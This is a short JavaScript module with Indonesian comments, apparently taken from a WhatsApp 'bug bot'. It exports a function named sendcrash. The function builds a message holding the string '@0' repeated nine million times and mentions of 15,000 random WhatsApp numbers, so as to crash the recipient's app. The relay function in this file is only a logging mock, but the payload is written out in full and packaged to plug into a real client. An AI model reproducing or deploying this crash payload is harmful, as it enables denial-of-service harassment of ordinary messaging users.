// Definisikan aorbugz secara langsung di file ini
const aorbugz = {
    // relayMessage adalah fungsi mock (tiruan) yang meniru perilaku yang diharapkan
    relayMessage: async (target, message, options) => {
        console.log(`Mengirim pesan ke: ${target}`);
        console.log(`Pesan: ${message.extendedTextMessage.text}`);
        // Di sini bisa ditambahkan logika lebih lanjut atau integrasi ke API jika ada
        return Promise.resolve(); // Mengembalikan promise yang sukses
    }
};

async function sendcrash(target, Ptcp = false) {
    await aorbugz.relayMessage(target, {
        extendedTextMessage: {
            text: "⩟⬦𪲁 Aorbugz?͜͢𝐒 -" + "@0".repeat(9000000),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({
                        length: 15000
                    }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "0@s.whatsapp.net",
            }
        }
    }, Ptcp ? { participant: { jid: target } } : {});
}

module.exports = sendcrash;
